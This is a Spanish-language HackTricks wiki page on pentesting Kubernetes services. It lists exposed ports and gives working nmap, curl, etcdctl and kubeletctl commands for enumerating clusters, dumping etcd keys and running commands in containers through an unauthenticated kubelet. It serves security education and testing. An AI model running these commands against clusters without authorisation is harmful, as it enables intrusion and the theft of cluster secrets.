# Pentesting Servicios de Kubernetes

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* ¡Consulta los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

Kubernetes utiliza varios **servicios de red específicos** que podrías encontrar **expuestos en Internet** o en una **red interna una vez que hayas comprometido un pod**.

## Encontrar pods expuestos con OSINT

Una forma podría ser buscar `Identity LIKE "k8s.%.com"` en [crt.sh](https://crt.sh) para encontrar subdominios relacionados con Kubernetes. Otra forma podría ser buscar `"k8s.%.com"` en github y buscar archivos **YAML** que contengan la cadena.

## Cómo Kubernetes expone servicios

Podría ser útil para ti entender cómo Kubernetes puede **exponer servicios públicamente** para encontrarlos:

{% content-ref url="exposing-services-in-kubernetes.md" %}
[exposing-services-in-kubernetes.md](exposing-services-in-kubernetes.md)
{% endcontent-ref %}

## Encontrar pods expuestos mediante escaneo de puertos

Los siguientes puertos podrían estar abiertos en un clúster de Kubernetes:

| Puerto          | Proceso        | Descripción                                                            |
| --------------- | -------------- | ---------------------------------------------------------------------- |
| 443/TCP         | kube-apiserver | Puerto de la API de Kubernetes                                         |
| 2379/TCP        | etcd           |                                                                        |
| 6666/TCP        | etcd           | etcd                                                                   |
| 4194/TCP        | cAdvisor       | Métricas de contenedores                                               |
| 6443/TCP        | kube-apiserver | Puerto de la API de Kubernetes                                         |
| 8443/TCP        | kube-apiserver | Puerto de la API de Minikube                                           |
| 8080/TCP        | kube-apiserver | Puerto de la API inseguro                                              |
| 10250/TCP       | kubelet        | API HTTPS que permite acceso en modo completo                          |
| 10255/TCP       | kubelet        | Puerto HTTP de solo lectura sin autenticación: pods, pods en ejecución y estado del nodo |
| 10256/TCP       | kube-proxy     | Servidor de verificación de estado de Kube Proxy                      |
| 9099/TCP        | calico-felix   | Servidor de verificación de estado para Calico                        |
| 6782-4/TCP      | weave          | Métricas y puntos finales                                              |
| 30000-32767/TCP | NodePort       | Proxy a los servicios                                                  |
| 44134/TCP       | Tiller         | Servicio de Helm escuchando                                            |

### Nmap

{% code overflow="wrap" %}
```bash
nmap -n -T4 -p 443,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 <pod_ipaddress>/16
```
{% endcode %}

### Kube-apiserver

Este es el servicio **API Kubernetes** con el que los administradores suelen comunicarse utilizando la herramienta **`kubectl`**.

**Puertos comunes: 6443 y 443**, pero también 8443 en minikube y 8080 como inseguro.
```
curl -k https://<IP Address>:(8|6)443/swaggerapi
curl -k https://<IP Address>:(8|6)443/healthz
curl -k https://<IP Address>:(8|6)443/api/v1
```
**Verifica la siguiente página para aprender cómo obtener datos sensibles y realizar acciones sensibles hablando con este servicio:**

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

### API de Kubelet

Este servicio **se ejecuta en cada nodo del clúster**. Es el servicio que **controlará** las pods dentro del **nodo**. Se comunica con el **kube-apiserver**.

Si encuentras este servicio expuesto, es posible que hayas encontrado un **RCE sin autenticación**.

#### API de Kubelet
```
curl -k https://<IP address>:10250/metrics
curl -k https://<IP address>:10250/pods
```
Si la respuesta es `Unauthorized` entonces requiere autenticación.

Si puedes listar nodos, puedes obtener una lista de puntos finales de kubelets con:
```bash
kubectl get nodes -o custom-columns='IP:.status.addresses[0].address,KUBELET_PORT:.status.daemonEndpoints.kubeletEndpoint.Port' | grep -v KUBELET_PORT | while IFS='' read -r node; do
ip=$(echo $node | awk '{print $1}')
port=$(echo $node | awk '{print $2}')
echo "curl -k --max-time 30 https://$ip:$port/pods"
echo "curl -k --max-time 30 https://$ip:2379/version" #Check  also for etcd
done
```
#### kubelet (Solo lectura)
```
curl -k https://<IP Address>:10255
http://<external-IP>:10255/pods
```
### API de etcd
```
curl -k https://<IP address>:2379
curl -k https://<IP address>:2379/version
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```
### Tiller
```
helm --host tiller-deploy.kube-system:44134 version
```
Puedes abusar de este servicio para escalar privilegios dentro de Kubernetes:

### cAdvisor

Servicio útil para recopilar métricas.
```
curl -k https://<IP Address>:4194
```
### NodePort

Cuando un puerto se expone en todos los nodos a través de un **NodePort**, el mismo puerto se abre en todos los nodos para redirigir el tráfico al **Servicio** declarado. Por defecto, este puerto estará en el **rango 30000-32767**. Por lo tanto, nuevos servicios no verificados podrían ser accesibles a través de esos puertos.
```
sudo nmap -sS -p 30000-32767 <IP>
```
## Configuraciones Vulnerables

### Acceso Anónimo al Kube-apiserver

El acceso anónimo a los **puntos finales de la API del kube-apiserver no está permitido**. Sin embargo, podrías verificar algunos puntos finales:

![](https://www.cyberark.com/wp-content/uploads/2019/09/Kube-Pen-2-fig-5.png)

### **Verificación de Acceso Anónimo a ETCD**

ETCD almacena secretos del clúster, archivos de configuración y más **datos sensibles**. Por **defecto**, el ETCD **no puede** ser accedido **anónimamente**, pero siempre es bueno verificar.

Si el ETCD se puede acceder de forma anónima, es posible que necesites **utilizar la** [**herramienta etcdctl**](https://github.com/etcd-io/etcd/blob/master/etcdctl/READMEv2.md). El siguiente comando obtendrá todas las claves almacenadas:
```
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```
### **RCE de Kubelet**

La [**documentación de Kubelet**](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/) explica que por **defecto se permite el acceso anónimo** al servicio:

> Habilita las solicitudes anónimas al servidor Kubelet. Las solicitudes que no son rechazadas por otro método de autenticación se tratan como solicitudes anónimas. Las solicitudes anónimas tienen un nombre de usuario `system:anonymous` y un nombre de grupo `system:unauthenticated`.

Para comprender mejor cómo funciona la **autenticación y autorización de la API de Kubelet**, consulta esta página:

{% content-ref url="../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

El **API del servicio Kubelet no está documentado**, pero el código fuente se puede encontrar aquí y encontrar los puntos finales expuestos es tan fácil como **ejecutar**:
```bash
curl -s https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/server/server.go | grep 'Path("/'

Path("/pods").
Path("/run")
Path("/exec")
Path("/attach")
Path("/portForward")
Path("/containerLogs")
Path("/runningpods/").
```
Puedes usar la herramienta [**Kubeletctl**](https://github.com/cyberark/kubeletctl) para interactuar con Kubelets y sus endpoints.

#### /pods

Este endpoint lista pods y sus contenedores:
```bash
kubeletctl pods
```
#### /exec

Este endpoint permite ejecutar código dentro de cualquier contenedor de forma muy sencilla:
```bash
kubeletctl exec [command]
```
{% hint style="info" %}
Para evitar este ataque, el servicio _**kubelet**_ debe ejecutarse con `--anonymous-auth false` y el servicio debe estar segregado a nivel de red.
{% endhint %}

### **Comprobación de la Exposición de Información del Puerto de Solo Lectura de Kubelet**

Cuando se expone un **puerto de solo lectura de kubelet**, se vuelve posible que terceros no autorizados recuperen información de la API. La exposición de este puerto puede llevar a la divulgación de varios **elementos de configuración del clúster**. Aunque la información, incluidos **nombres de pods, ubicaciones de archivos internos y otras configuraciones**, puede que no sea crítica, su exposición sigue representando un riesgo de seguridad y se debe evitar.

Un ejemplo de cómo esta vulnerabilidad puede ser explotada implica que un atacante remoto acceda a una URL específica. Al navegar a `http://<IP-externa>:10255/pods`, el atacante potencialmente puede recuperar información sensible del kubelet:

![https://www.cyberark.com/wp-content/uploads/2019/09/KUbe-Pen-2-fig-6.png](https://www.cyberark.com/wp-content/uploads/2019/09/KUbe-Pen-2-fig-6.png)

## Referencias

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2" %}

{% embed url="https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet" %}

{% hint style="success" %}
Aprende y practica Hacking en AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* ¡Consulta los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
